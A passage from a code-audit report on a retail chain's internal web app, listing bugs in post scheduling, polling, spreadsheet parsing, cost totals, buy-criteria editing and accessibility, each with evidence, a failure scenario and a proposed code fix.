**Evidence.** etWallClockToUtc samples the offset at the wall time read AS UTC (`const asUtc = Date.UTC(...); ... formatToParts(new Date(asUtc)) ... const offset = shownMs - asUtc;`, 15319-15325), which is 4–5 hours before the real instant. Running it in node: `2026-03-08T03:30` → 4:30 AM ET, `2026-03-08T06:30` → 7:30 AM ET, `2026-11-01T03:00` → 2:00 AM ET, `2026-11-01T05:30` → 4:30 AM ET. The comment claims "DST-safe". On the frontend, the popover's `def`/`min` use device-local `getHours()` (18189-18192) under the label 'Date & time (ET)'. ctCurrentWeekNo uses `new Date().toISOString().slice(0,10)` (18668), and buildCaption uses the same UTC date (worker.js:7441), so after 8pm ET on Saturday both treat next week as "this week". Card times (18181) print without "ET".

**Failure scenario.** An early 5:00 AM Sunday post scheduled for 2026-11-01 goes out at 4:00 AM, and one on 2026-03-08 at 6:30 goes out at 7:30. Brian travelling in Central time opens the popover and the default "1 hour from now" is really now in ET, so the worker answers "Pick a time in the future" (which also triggers finding content-flow-3). A promo caption drafted Saturday night pulls next week's theme.

**Proposed fix.** Worker (one function, backward-compatible): compute `off1 = offsetAt(asUtc); const guess = asUtc - off1; const off2 = offsetAt(guess); return new Date(asUtc - off2);` with a small table test over both 2026 transitions. Frontend: build `def`/`min` from `Intl.DateTimeFormat('en-CA', { timeZone: 'America/New_York', ... })` parts, append ' ET' in ctFmtSchedTime, and derive ctCurrentWeekNo's date in America/New_York.

<a id="content-flow-19"></a>
#### content-flow-19 — Polling: duplicate reload loops keep running on other pages, the Drafts lane flashes 'Loading…' every 15s, and flow weeks are fetched twice on entry

*low · minor · performance · confidence high · `index.html:19322` · unverified*

**Evidence.** The 1s ticker reloads every 15 ticks (`if (++ctPubTicks % 15 === 0) ctLoadDrafts();`, 19322), and ctPollPublishing runs its own 15s setTimeout chain (19481-19488), so every publish means two full `drafts&status=all` fetches (up to 300 rows with captions) every 15s. Neither checks whether #page-content is visible; the ticker stops only when no `.ct-pub-track` exists in the hidden DOM. Every reload starts with `el('ct-drafts').innerHTML = '...Loading…'` (19205). ctEnsureFlowWeeks caches only the resolved value (`if (ctFlowWeeks) return ctFlowWeeks;`, 18654), so concurrent callers race. The Chromium call log on first entry shows `action=flow-calendar&fy=F26` fetched twice (from ctLoadDrafts and ctLoadPhotos).

**Failure scenario.** After tapping Publish, Brian goes to the Dashboard. For the next minute or two the phone keeps fetching the full drafts list about every 7 seconds in the background, and back on Posts the Drafts column blinks 'Loading…' every 15s under his thumb while he tries to tap Edit.

**Proposed fix.** Memoise the promise: `let ctFlowWeeksP = null; function ctEnsureFlowWeeks() { return ctFlowWeeksP || (ctFlowWeeksP = fetch(...).then(r => r.json()).then(d => (ctFlowWeeks = d.weeks || [])).catch(() => { ctFlowWeeksP = null; return (ctFlowWeeks = []); })); }`. Paint 'Loading…' only when `!ctAllDrafts.length`. Drop ctPollPublishing and let the ticker's reload be the single loop, skipping the reload when `el('page-content').classList.contains('hidden')`.

<a id="content-flow-20"></a>
#### content-flow-20 — Photo picker and pipeline silently truncate (photos LIMIT 200 per store, never retired; drafts LIMIT 300 across every status)

*low · minor · bug · confidence high · `worker.js:17209` · unverified*

**Evidence.** `q += " ORDER BY created_at DESC LIMIT 200";` (17209), and the frontend always asks for `status=new` (18644). Nothing ever updates marketing_photos.status (no UPDATE marketing_photos anywhere in worker.js), so it means the newest 200 of all time. Drafts: `ORDER BY COALESCE(d.updated_at, d.created_at) DESC LIMIT 300` (17295). The UI shows no truncation cue; folder counts and 'N of M attached' just read lower.

**Failure scenario.** After about six weeks of Thursday bin batches, the oldest week folder shows 7 photos when 30 were submitted. Opening an older draft in Edit keeps 23 selected photos that aren't visible anywhere ('N of M attached' counts them), and they still publish. Eventually the oldest Published weeks drop out of the archive without notice.

**Proposed fix.** Minor: when `ctPhotos.length === 200`, render "Showing the newest 200 photos" under the folder grid, and do the same in the Published lane when `ctAllDrafts.length === 300`. Major follow-up: add `since`/`week` parameters to marketing-photos (defaulting to the last 8 retail weeks plus any ids referenced by open drafts), and split the drafts endpoint into active (all draft/scheduled rows, no cap) and a paged archive. Worker first; both params are additive.

<a id="content-flow-21"></a>
#### content-flow-21 — Accessibility gaps: unlabelled composer controls, picker tiles with no name or state, tabs with no roles, Flow modals with no dialog semantics or Escape, edit cells unreachable by keyboard

*low · minor · accessibility · confidence high · `index.html:4265` · unverified*

**Evidence.** `<label class="...">Store</label>` with no `for` before `<select id="ct-store">` (4265-4266); the same for Caption/#ct-caption (4297-4300) and "What's this post about?"/#ct-topic (4291-4292). Cover and photo tiles are `<button ...><img ... alt="">` with no aria-label or aria-pressed (18567-18568, 18688). The `.ct-tab` buttons (4251-4253) have no role=tablist/tab or aria-selected. The Flow week and segment modals (5633, 5666) have no role=dialog or aria-modal and no Escape handler, and their close buttons are a bare `×` (5638, 5671). Edit mode relies on clicks on `<td data-fcwk>` (19524-19530), which have no tabindex or role.

**Failure scenario.** With VoiceOver, the cover picker reads as "button, button, button" with no way to tell which cover is selected, and the Store select is announced without its label. A keyboard-only admin cannot open any week in the Flow editor, and Escape does not close its modals.

**Proposed fix.** Add `for=` to the three labels. Give tiles `aria-label="${escapeHtml(t.name||'Cover')}" aria-pressed="${on}"` (for photos: `Photo ${idx+1}` with type and date). Put `role="tablist"` on the nav and `role="tab" aria-selected` on the tabs, updated in ctSetTab. Add `role="dialog" aria-modal="true" aria-labelledby` to both Flow modals, `aria-label="Close"` on ×, and a document keydown Escape handler while open. In edit mode, render `tabindex="0" role="button"` on editable cells and handle Enter/Space in fcTblClick.

<a id="content-flow-23"></a>
#### content-flow-23 — Small UX traps: Delete on a Published card says 'Delete this draft?', AI generate overwrites typed text, Flow seed defaults to a past week, 'Retry' opens a scheduler

*low · minor · ui-ux · confidence high · `index.html:19422` · unverified*

**Evidence.** ctDeleteDraft always asks `uiConfirm('Delete this draft?', ...)` (19422), including from Published cards (`aria-label="Delete record"`, 19230). It deletes only the D1 row (draft-delete), not the Facebook post, and also silently ignores worker errors (`try { await fetch(...) } catch (_) {}`, 19424). ctAiCaption does `el('ct-caption').value = d.caption || ''` with no check for existing text, and a programmatic set also clears the textarea's undo stack (19192). ctFlowSeedModal lists every F26 week with the first, W14 (March), preselected (18253-18256). The schedule_error card's `Retry` (19235) opens the schedule popover rather than retrying.

**Failure scenario.** Brian deletes a Published card thinking it removes the Facebook post, and the post stays up. He writes a caption by hand, taps ✨ AI generate to compare, and his version is gone with no undo. In From Flow he taps Create drafts without scrolling and seeds six drafts for Easter week.

**Proposed fix.** Published delete: `uiConfirm('Remove this from the archive? The Facebook post itself stays up.', { okText: 'Remove record' })`, and check `r.ok`/`d.ok`, surfacing 409s. AI: `if (el('ct-caption').value.trim() && !(await uiConfirm('Replace your caption with an AI draft?', { okText: 'Replace' }))) return;`. Seed modal: preselect the week containing today, or the next one (`opt.selected` by week_start ≤ today ≤ week_end). Rename Retry to 'Reschedule…'.

<a id="content-flow-22"></a>
#### content-flow-22 — The live preview is an Instagram mock-up (fake handle, 2,200 IG limit, caption below a 150-char cut), not what the Facebook Page post will look like

*low · major · ui-ux · confidence high · `index.html:4334` · unverified*

**Evidence.** The header says 'Live preview — posts to Facebook', but the card is Instagram chrome: `♡ ✉ ↗ ⌗` (4334), handle `'binstore.' + name.toLowerCase()...` (18381), and the caption placed BELOW a square carousel, cut at `cap.length > 150 ? cap.slice(0,150)+'…'` (18431). The counter is '0 / 2,200' (4308, 18433), which is Instagram's limit. buildCaption's own guidance is 50–80 words because Facebook hides the rest behind 'See more' (worker.js:7500), and the real Page name lives in facebook_page_targets.page_name.

**Failure scenario.** Brian judges a caption by the preview. On Facebook the caption sits above the photos and 'See more' cuts in at a different place, the Page name is 'Bargain Lane Coliseum' rather than 'binstore.coliseum', and a 120-word caption shows a comfortable '640 / 2,200' in green even though most of it will be hidden.

**Plan.** Plan (a redesign, so major): return page_name with the thumbnails/drafts payload, or add a small `fb-pages` read. Reshape the preview as a Facebook Page post: avatar, page name and 'Just now · 🌐', caption ABOVE the media with a 'See more' cut at FB's ~3 lines or about 80 words, and a 1+N grid instead of a carousel. Replace the 2,200 counter with a word count against the 50–80 target. Frontend-only apart from exposing page_name, which is additive, so the worker goes first. Verify at 393px and 1280px in both themes.

</details>

<a id="merch-buying"></a>
### Merchandising tables (Manifests, Coverage, Products, Velocity, Buy Criteria, Shelf Count)

This unit works end to end, and its XSS handling is good: vendor descriptions, category labels and file headers are escaped on every innerHTML path I traced. Buy Criteria, Coverage and Velocity mostly follow the §4.8 panel, bar, legend and sticky-column pattern. The biggest risks are wrong numbers and silently lost data. The .xlsx parser shifts cells when a formatted empty cell precedes a value (reproduced). A stray inch mark in a CSV merges the rest of the file (reproduced). The 'Landed cost' headline leaves out freight while the list includes it. Coverage, Velocity and the scorer's shelf data use the most recently entered week rather than the latest week. Several features are broken for real inputs or users: Products saves fail for model-number identifiers, the Velocity Year window reads 1,820 KV keys, decisions above ~1,250 lines exceed D1's value size, and on Sunday evenings ET the Shelf Count default week is the following week. Buy Criteria has two problems I confirmed in Chromium: keyboard focus is lost after every edit, and inherited values render as UA placeholder text at 2.54:1. It also lets an empty string get past the chain-default guard, and a non-numeric value switches a gate off without warning. The loaders have no request token, so late responses can overwrite newer state, which on Shelf Count can write one store's counts to another, and the retail lookup loop can switch to a different manifest partway through. The Scorer's own tables still fall short of §4.8 (no sticky first column, no legend), and a 5,000-line manifest blocks the main thread for about 4.3 s after every action.

| ID | Sev | Size | Category | Finding | Where | Verified |
|---|---|---|---|---|---|---|
| [merch-buying-1](#merch-buying-1) | high | minor | bug | xlsx parser: a self-closing empty cell swallows the next cell, shifting values into the wrong columns without any error | `worker.js:11551` | unverified |
| [merch-buying-2](#merch-buying-2) | high | minor | bug | Products: saving any product whose identifier is a model number fails with 'No such product' | `worker.js:23209` | unverified |
| [merch-buying-3](#merch-buying-3) | high | minor | bug | The 'Landed cost' headline leaves out freight, and the list's 'Landed cost' for the same manifest is a different number | `index.html:23347` | unverified |
| [merch-buying-4](#merch-buying-4) | medium | minor | bug | The retail lookup loop re-reads the currently open manifest on every round, so it can switch to a different manifest partway through | `index.html:23437` | unverified |
| [merch-buying-5](#merch-buying-5) | medium | minor | bug | 'Read file' and 'Use this mapping' can be double-submitted: duplicate drafts, two paid PDF reads, and lines written twice by overlapping remaps | `index.html:23157` | unverified |
| [merch-buying-6](#merch-buying-6) | medium | minor | ui-ux | Buy Criteria: pressing Tab or tapping the next cell after an edit drops keyboard focus, because every change rebuilds the table | `index.html:27292` | unverified |
| [merch-buying-7](#merch-buying-7) | medium | minor | accessibility | Buy Criteria: inherited cells show their value only as UA placeholder text at 2.54:1 in light mode | `index.html:27262` | unverified |
| [merch-buying-8](#merch-buying-8) | medium | minor | bug | The 'chain default cannot be cleared' guard can be bypassed with an empty string, which is exactly what the page sends | `worker.js:22041` | unverified |
| [merch-buying-9](#merch-buying-9) | medium | minor | bug | Criteria values are never validated, so typing '30%' switches a gate off without any warning | `worker.js:22062` | unverified |
| [merch-buying-10](#merch-buying-10) | medium | minor | bug | Coverage, Velocity and the scorer take each store's most recently ENTERED shelf week, not its latest week, so a backfilled older count replaces the current one | `worker.js:26417` | unverified |
| [merch-buying-11](#merch-buying-11) | medium | minor | ui-ux | Coverage says 'N/5 counted this week' for any store that has ever counted, and never says which week each shelf figure comes from | `index.html:27016` | unverified |
| [merch-buying-13](#merch-buying-13) | medium | minor | bug | Window toggles and product search let older responses overwrite newer ones; Velocity/Coverage also store the error body as data | `index.html:26884` | unverified |
| [merch-buying-14](#merch-buying-14) | medium | minor | bug | Shelf Count: switching store or week quickly can put one store's counts in the form while Save writes them to another | `index.html:30425` | unverified |
| [merch-buying-15](#merch-buying-15) | medium | minor | bug | Manifests: the list and an open manifest can overwrite each other when one response arrives late | `index.html:23186` | unverified |
| [merch-buying-16](#merch-buying-16) | medium | minor | bug | Shelf Count's default week is calculated in UTC, so on Sunday evening ET 'This week' jumps to the next week | `index.html:30381` | unverified |
| [merch-buying-17](#merch-buying-17) | medium | minor | ui-ux | Buy Criteria: leaving the page silently discards unpublished edits | `index.html:27130` | unverified |
| [merch-buying-20](#merch-buying-20) | medium | minor | bug | A decided manifest can be re-decided, which replaces its frozen record, and it still offers four actions the worker refuses | `index.html:23327` | unverified |
| [merch-buying-24](#merch-buying-24) | medium | minor | bug | CSV parser: an unescaped inch mark in a description merges the rest of the file into one cell | `worker.js:11206` | unverified |
| [merch-buying-26](#merch-buying-26) | medium | minor | accessibility | Manifest Scorer colour contrast fails: inline #6b6453 in dark mode, the 'vs std' green/amber in light mode, and the 'pass' badge in light mode | `index.html:23304` | unverified |
| [merch-buying-27](#merch-buying-27) | medium | minor | accessibility | Coverage red text and the CUT badge fail AA in both themes | `index.html:4645` | unverified |
| [merch-buying-28](#merch-buying-28) | medium | minor | ui-ux | The Manifest Scorer's tables don't follow DESIGN.md §4.8: no sticky first column, no legend, no level cue | `index.html:4538` | unverified |
| [merch-buying-29](#merch-buying-29) | medium | minor | performance | A large manifest blocks the main thread for seconds, and it happens again after every action | `index.html:23289` | unverified |
| [merch-buying-30](#merch-buying-30) | medium | minor | ui-ux | The mapping screen can't show whether the chosen mapping is right: the sample has only the first 4 columns and the header diagnostics are dropped | `index.html:23142` | unverified |
| [merch-buying-31](#merch-buying-31) | medium | minor | accessibility | Keyboard and screen-reader gaps: clickable rows and cells can't be focused, table inputs have no labels, toggles have no pressed state | `index.html:24567` | unverified |
| [merch-buying-12](#merch-buying-12) | medium | major | performance | Velocity's 'Year' window reads 1,820 KV snapshots per request, well past the ~1,000-per-invocation ceiling the repo designs around elsewhere | `worker.js:26330` | unverified |
| [merch-buying-23](#merch-buying-23) | medium | major | bug | Remapping a PDF sends it through Claude again, so the rows stored can differ from the rows the user confirmed | `worker.js:22392` | unverified |
| [merch-buying-25](#merch-buying-25) | medium | major | bug | The decision snapshot exceeds D1's ~2 MB value limit at around 1,250 lines, so large manifests cannot be decided | `worker.js:22766` | unverified |
| [merch-buying-35](#merch-buying-35) | medium | major | ui-ux | A wrong category or price on a manifest line can't be fixed from the Scorer, and Products edits don't reach lines already written | `worker.js:22549` | unverified |
| [merch-buying-18](#merch-buying-18) | low | minor | bug | Removing an override that was added but never saved queues 10 phantom changes, and publishing them creates a version that changes nothing | `index.html:27206` | unverified |
| [merch-buying-19](#merch-buying-19) | low | minor | bug | The Chain default Core checkbox always shows unchecked, and the Core column has none of the three cell states | `index.html:27252` | unverified |
| [merch-buying-21](#merch-buying-21) | low | minor | ui-ux | 'Record decision' asks the buyer to type an enum value into a free-text prompt | `index.html:23495` | unverified |
| [merch-buying-22](#merch-buying-22) | low | minor | bug | Admins are shown Delete and Look up retail, but the worker only allows superusers to run them | `index.html:23325` | unverified |
| [merch-buying-32](#merch-buying-32) | low | minor | ui-ux | The phone surfaces zoom on focus in iOS (inputs under 16px) and have small tap targets | `index.html:5093` | unverified |
| [merch-buying-33](#merch-buying-33) | low | minor | ui-ux | §4.8 trap 4 again: the 'Only overrides' checkbox and the manifest file picker render as white UA controls in dark mode | `index.html:5546` | unverified |
| [merch-buying-34](#merch-buying-34) | low | minor | ui-ux | Coverage and Velocity §4.8 gaps: duplicate ids, incomplete legends, no hierarchy badges, store codes vs names | `index.html:27097` | unverified |
| [merch-buying-36](#merch-buying-36) | low | minor | bug | Manifest inputs: a stale file can be re-uploaded, 'Read file' works before the read finishes, and cost fields silently drop the minus sign | `index.html:23050` | unverified |
| [merch-buying-37](#merch-buying-37) | low | minor | ui-ux | Products: the list stops at 200 with no indication, and it is loaded only once per session | `index.html:24512` | unverified |
| [merch-buying-38](#merch-buying-38) | low | minor | bug | Manifest list dates and change-log dates are UTC, so evening uploads show tomorrow's date | `index.html:23015` | unverified |
| [merch-buying-39](#merch-buying-39) | low | minor | ui-ux | Shelf Count: numbers carried over from last week look exactly like numbers entered this week | `index.html:30401` | unverified |

<details><summary>Details: evidence, failure scenario, proposed fix</summary>

<a id="merch-buying-1"></a>
#### merch-buying-1 — xlsx parser: a self-closing empty cell swallows the next cell, shifting values into the wrong columns without any error

*high · minor · bug · confidence high · `worker.js:11551` · unverified*

**Evidence.** worker.js:11551 `for (const cm of rm[1].matchAll(/<c([^>]*)>([\s\S]*?)<\/c>/g))`. Excel writes a formatted empty cell as `<c r="A2" s="3"/>`. `<c([^>]*)>` matches `<c r="A2" s="3"/`, and the lazy body then runs on to the NEXT cell's `</c>`. So the next cell's `<v>` is credited to A2, and because its `t="s"` sits in the swallowed text, the type falls back to "n". I ran the real xlsxRows (zip helpers stubbed) on the row `<c r="A2" s="3"/><c r="B2" t="s"><v>4</v></c><c r="C2"><v>5</v></c>…`. It returned `["4","","5","1.25"]` where it should have returned `["","Widget","5","1.25"]`. The description is gone, and the identifier column holds "4", which is a shared-string index. The xlsxCol comment (11513-11515) names this exact misalignment as the thing to avoid.

**Failure scenario.** A vendor .xlsx has a bordered but blank UPC cell in front of the description on some rows, which is common. On those rows the description is empty and the UPC holds a small integer. Classification and retail lookup then run on garbage, the lines read as 'no description', and the mapping screen's 5-row sample may not include an affected row, so nobody notices.

**Proposed fix.** Make the cell regex match both forms: `matchAll(/<c\b([^>]*?)(?:\/>|>([\s\S]*?)<\/c>)/g)`, with `const attrs = cm[1], inner = cm[2] || "";`. Give the row regex the same treatment (`/<row\b[^>]*?(?:\/>|>([\s\S]*?)<\/row>)/g`, then skip a self-closed row), so an empty styled row cannot merge into the next one. Add a case to the offline tests with a self-closing cell before a shared-string cell. This is worker-only and backward-compatible.

<a id="merch-buying-2"></a>
#### merch-buying-2 — Products: saving any product whose identifier is a model number fails with 'No such product'

*high · minor · bug · confidence high · `worker.js:23209` · unverified*

**Evidence.** worker.js:23209 `const identifier = merchCanonicalUpc(String(b?.identifier || "").trim()) || String(b?.identifier || "").trim();`. merchCanonicalUpc (10639) starts with `String(raw).replace(/\D/g, "")`, so it strips every non-digit. Running it gives: 'KX-TG6812' -> '6812', 'B07XJ8C8F5' -> '07885', 'SKU-00123' -> '00123'. The UPDATE at 23254-23256 is then `WHERE identifier = ? AND identifier_type = ?` with the mangled key, gets 0 changes, and returns 404 'No such product'. Rows with `identifier_type='model'` really are in item_cache: manifestClassify (12172) and the retail run (10989) upsert them with the manifest line's identifier, and the Products 'Manifests' tab lists them. A legacy 13-digit UPC starting with 0 is also re-keyed to 12 digits and misses the same way.

**Failure scenario.** An admin opens Products > Manifests, taps a line whose identifier is a model number such as 'KX-TG6812', fixes its category or street price, and presses Save. The status reads 'Could not save: No such product'. Correcting manifest-sourced products is the page's stated purpose, and it cannot be done for these rows.

**Proposed fix.** The page sends back the exact key it got from the list, so update by that key first and only fall back to the canonical form: `const raw = String(b?.identifier||"").trim(); const canon = merchCanonicalUpc(raw); let r = await upd(raw); if (!r.meta?.changes && canon && canon !== raw) { r = await upd(canon); identifier = canon; }`. Alternatively, canonicalize only when `/^\d+$/.test(raw)`. Line 23317 has the same `merchCanonicalUpc(raw) || raw` pattern and deserves the same check. This is worker-only and backward-compatible.

<a id="merch-buying-3"></a>
#### merch-buying-3 — The 'Landed cost' headline leaves out freight, and the list's 'Landed cost' for the same manifest is a different number

*high · minor · bug · confidence high · `index.html:23347` · unverified*

**Evidence.** index.html:23347 `<div class="mf-cap">Landed cost</div><div class="mf-big">${mfMoney(s.totals.cost)}</div>`. s.totals.cost is summed from rollup rows, and worker.js:12829 builds those as `r.cost += (Number(l.cost) || 0) * qty`, where l.cost is the invoice cost per unit (manifestBuild keeps `cost: costPerUnit` and puts freight in `effective_cost`, 12467-12472). Freight and the unsellable share never reach the KPI, and 'Cost of ASP' (23349) uses the same total. The list query at worker.js:22476-22477 computes `SUM(l.cost * l.qty) + COALESCE(m.freight_cost, 0) AS landed_cost`, which includes freight and also counts the 'no line detail' subtotal rows the scorer deliberately leaves out (12823-12825). The cost-basis bar right above the KPI says freight is 'folded into every cost test below' (23257).

**Failure scenario.** A buyer enters $1,500 freight on a $10,000 load. The Recent list shows Landed cost $11,500, but the open manifest's big number still says Landed cost $10,000, and 'Cost of ASP' is understated by 15%. The buyer calls the vendor holding the wrong headline figure.

**Proposed fix.** Frontend fix in mfRenderScore: `const freight = Number(m.freight_cost) || 0; const landed = (s.totals.cost || 0) + freight;`. Show `mfMoney(landed)` as 'Landed cost', with an mf-sub line reading `invoice ${mfMoney(s.totals.cost)} + freight ${mfMoney(freight)}` when freight > 0, and compute 'Cost of ASP' from `landed / s.totals.aspValue`. Snapshots freeze m.freight_cost as well, so frozen views stay consistent. As a separate worker-only follow-up, drop `flags LIKE '%no line detail%'` lines from the list's SUM so both screens add up the same lines.

<a id="merch-buying-4"></a>
#### merch-buying-4 — The retail lookup loop re-reads the currently open manifest on every round, so it can switch to a different manifest partway through

*medium · minor · bug · confidence high · `index.html:23437` · unverified*

**Evidence.** index.html:23437 `const j = await mfApi('manifest-retail', { id: mfOpenId });` runs inside a loop of up to 41 rounds, and each round is a batch of web lookups. mfOpenId is global: mfOpen() sets it to another id and mfList() sets it to null. On the worker side, each call runs `UPDATE manifests SET auto_retail = 1 WHERE id = ?` (22660), with the comment 'Pressing the button is the consent.' When the loop ends it calls `mfOpen(mfOpenId)`, which opens whichever manifest is current at that moment. mfClassify (23200-23201) and mfSaveCosts (23267) also reopen whatever mfOpenId is after their await.

**Failure scenario.** An admin starts 'Look up retail' on manifest A, which runs for minutes by design, then opens manifest B from the list to read something. The next round prices B and turns on B's auto_retail, so the every-minute drainer keeps spending lookups on a load nobody approved. If the admin went back to the list instead, the next round sends id:null and a confusing 'Lookup failed: No such manifest' alert appears.

**Proposed fix.** Capture the id once at the top: `const id = mfOpenId;`. Call `mfApi('manifest-retail', { id })`, and at the top of each round `if (mfOpenId !== id) { mfSay('Lookup continues in the background.'); return; }`. At the end, only `if (mfOpenId === id) mfOpen(id);`. Apply the same capture in mfClassify and mfSaveCosts.

<a id="merch-buying-5"></a>
#### merch-buying-5 — 'Read file' and 'Use this mapping' can be double-submitted: duplicate drafts, two paid PDF reads, and lines written twice by overlapping remaps

*medium · minor · bug · confidence medium · `index.html:23157` · unverified*

**Evidence.** mfUpload (23083) and mfConfirmMap (23146) have no in-flight flag and never disable their buttons. manifest-upload inserts a `manifests` row and writes its lines immediately (worker.js:22306-22312). For a PDF, every call is a billed Claude read (11580-11583). manifest-remap runs `DELETE FROM manifest_lines WHERE manifest_id = ?` and then manifestWriteLines in separate statements (22423-22426), and manifest_lines has no UNIQUE(manifest_id,row_no) (migration-043.sql:44-75). Two overlapping remaps can each delete and then each insert. The page copy also promises 'Nothing is stored until you've confirmed the mapping' (23036), which is not what the upload does.

**Failure scenario.** A slow upload is double-clicked, leaving two identical drafts in Recent and, for a PDF, two billed reads. Double-clicking 'Use this mapping' on a 1,000-line sheet sends two remaps; both deletes land before both inserts, the manifest ends up with 2,000 lines, and every total doubles.

**Proposed fix.** Add `let mfBusy = false;`. In mfUpload and mfConfirmMap: `if (mfBusy) return; mfBusy = true; btn.disabled = true; try {…} finally { mfBusy = false; btn.disabled = false; }` (pass `this` from the onclick). Correct the copy to say a draft is saved as soon as the file is read and can be deleted from Recent. As a later worker hardening step, run the remap's DELETE and INSERTs in one env.DB.batch.

<a id="merch-buying-6"></a>
#### merch-buying-6 — Buy Criteria: pressing Tab or tapping the next cell after an edit drops keyboard focus, because every change rebuilds the table

*medium · minor · ui-ux · confidence high · `index.html:27292` · unverified*

**Evidence.** Each threshold input has `onchange="mcEdit(...)"` (27264), and mcEdit (27292-27295) runs `mcDirty.set(...); mcRender();`, which replaces `el('mc-tbl').innerHTML` (27288). change fires as focus leaves the cell, so the element that was about to receive focus has already been destroyed. I checked this in Chromium using the real mcRender and inputFor sliced from index.html: click the L2 'Max cost %' cell, type 25, press Tab, and `document.activeElement` is BODY.

**Failure scenario.** An admin entering a row of thresholds by keyboard (type, Tab, type, Tab) loses focus after every cell and has to click back in each time. On iPad or phone, tapping the next cell closes the keyboard. Filling in a new L2 takes ten separate clicks.

**Proposed fix.** Update the edited cell in place instead of re-rendering. Split the pill, Publish/Discard and status updates out of mcRender into `mcRenderChrome()`. Change the input to `onchange="mcEdit(${arg},'${field}',this.value,this)"`, and in mcEdit set `node.className = 'mc-dirty'` (or toggle the class on a checkbox) and call mcRenderChrome(). Keep full mcRender for add, remove and the Only-overrides toggle.

<a id="merch-buying-7"></a>
#### merch-buying-7 — Buy Criteria: inherited cells show their value only as UA placeholder text at 2.54:1 in light mode

*medium · minor · accessibility · confidence high · `index.html:27262` · unverified*

**Evidence.** For an inherited cell mcCellValue returns '' (27223), and the inherited value appears only as `placeholder="${ph}"` (27262). The `.mc-inherit` inkDim colour (5286-5287) styles typed text, and an inherited cell has none. The placeholder therefore takes Tailwind preflight's `input::placeholder{opacity:1;color:#9ca3af}` (present in the compiled site tailwind.css). In Chromium, getComputedStyle(input,'::placeholder').color is rgb(156,163,175). Against opl-panel #ffffff that is 2.54:1 (dark: 7.01). The comment at 5281-5285 says inherited cells were moved to inkDim at 5.29:1, but that colour never shows up on screen.

**Failure scenario.** In light mode every inherited threshold, which is most cells in the table, is pale grey at 2.54:1. It fails AA, and on a bright screen the numbers most people come to read are hard to make out.

**Proposed fix.** Add `#mc-tbl input.mc-inherit::placeholder{color:#6b6453;opacity:1}` and `.dark #mc-tbl input.mc-inherit::placeholder{color:rgb(var(--op-inkDim))}`, giving 5.88:1 light and 5.74:1 dark. Fix the comment to say the placeholder is what renders.

<a id="merch-buying-8"></a>
#### merch-buying-8 — The 'chain default cannot be cleared' guard can be bypassed with an empty string, which is exactly what the page sends

*medium · minor · bug · confidence high · `worker.js:22041` · unverified*

**Evidence.** worker.js:22041 checks `if (c.category == null && c.value == null)`, but when a chain cell is cleared the page sends `value: ''` (mcEdit stores this.value; mcPublish posts it, 27304-27307). `'' == null` is false, so the check passes. 22060-22063 then delete the chain row and skip the insert because `c.value !== ""` is false. In the published version, merchResolve returns `defaults[f] = {value:null}`, and manifestScore gives 'no cost cap set' and verdict 'unknown' for every line that inherits from the chain (12772-12777).

**Failure scenario.** An admin selects the Chain default 'Max cost %' cell and deletes it, perhaps meaning to retype it, then publishes with a note. From then on every manifest line outside an L2 override comes back 'unjudged', and the buy verdicts move toward 'Nothing here could be scored yet.'

**Proposed fix.** Worker-only and backward-compatible: `if (c.category == null && (c.value == null || String(c.value).trim() === "") && Object.hasOwn(MERCH_DEFAULTS, c.field)) return 400`. The optional chain fields with no default (dollar_ceiling, min_margin_per_unit, max_per_store) stay clearable. For a faster answer on the page, have mcEdit refuse `''` on the chain row for the same fields with a uiAlert and re-render.

<a id="merch-buying-9"></a>
#### merch-buying-9 — Criteria values are never validated, so typing '30%' switches a gate off without any warning

*medium · minor · bug · confidence high · `worker.js:22062` · unverified*

**Evidence.** Draft cells are stored as `String(c.value)` with no check (22062), and the page accepts any text (27262-27264, inputmode only). The scorer parses with `const num = v => { const n = Number(v); return Number.isFinite(n) ? n : null; }` (12715). Number('30%') is NaN, which becomes null, so capPct is null and the test is 'no cost cap set'. merchBuild's `asNum` treats min_gross_margin_pct and price_cap_pct_retail the same way (12425-12445). The column is headed 'Max cost %', which invites typing a % sign.

**Failure scenario.** An admin types '25%' into Consumable Food's Max cost % and publishes. Every food line on every manifest loses its cost test and shows 'unjudged', while the table still displays '25%' as though it applied.

**Proposed fix.** In mcEdit, for columns whose type is 'num': `const t = String(value).trim().replace(/[%$,\s]/g,''); if (t !== '' && !Number.isFinite(Number(t))) { uiAlert(`${label} needs a number`); mcRender(); return; } value = t;`. As a backward-compatible worker follow-up, reject non-numeric values for the numeric MERCH_FIELDS in merch-criteria-draft.

<a id="merch-buying-10"></a>
#### merch-buying-10 — Coverage, Velocity and the scorer take each store's most recently ENTERED shelf week, not its latest week, so a backfilled older count replaces the current one

*medium · minor · bug · confidence high · `worker.js:26417` · unverified*

**Evidence.** worker.js:26417 runs `SELECT store, week_ending, category, bays, id FROM shelf_counts ORDER BY id DESC` and then `if (!latestWeek[r.store]) latestWeek[r.store] = r.week_ending; if (r.week_ending !== latestWeek[r.store]) continue;`. The same pattern is at 26316 (velocity) and 12206 (merchShelfStates, which drives the scorer's 'dead on the shelf' flag and its one hard-fail rule). Shelf Count explicitly offers the last 8 weeks (scWeeks), and the status line says re-saving is normal.

**Failure scenario.** A manager enters week ending 9/20 on Monday, then on Tuesday backfills 9/13. From then on Coverage, Velocity 'per section' and the manifest scorer use that store's 9/13 shelf and ignore 9/20. The heatmap, BUY/FLOOR/CUT actions and hard-fail verdicts are all computed from last week's floor.

**Proposed fix.** Change the three queries to `ORDER BY week_ending DESC, id DESC`, which keeps 'newest row wins' within a week. Optionally bound the scan with `WHERE week_ending >= date('now','-180 days')` so the table read stops growing. This is worker-only and backward-compatible.

<a id="merch-buying-11"></a>
#### merch-buying-11 — Coverage says 'N/5 counted this week' for any store that has ever counted, and never says which week each shelf figure comes from

*medium · minor · ui-ux · confidence high · `index.html:27016` · unverified*

**Evidence.** index.html:27016 prints `${ch.storesCounted}/${ch.storesTotal} counted this week`. The worker sets `storesCounted: out.filter(s => s.hasShelf).length` (worker.js:13946), where hasShelf means the store has any count in any week (latestWeek, 26421). Each store in the response carries `shelfWeek`, but index.html never reads it (grep finds no use).

**Failure scenario.** A store last counted in July. Coverage reports '5/5 counted this week' and silently computes its shelf share from July's bays. The scorecard looks current and is two months stale for that store.

**Proposed fix.** Frontend-only. Compute this week's ET week-ending with the same helper as the scWeeks fix. Build the label as `${d.stores.filter(s => s.shelfWeek === wk).length}/${n} counted this week`, and when some stores are older add `· ${older} using an older count`. Add the week to each store `<th>` title and, when it is older than last week, a small cv-shelf line reading `count wk ending ${st.shelfWeek}`.

<a id="merch-buying-13"></a>
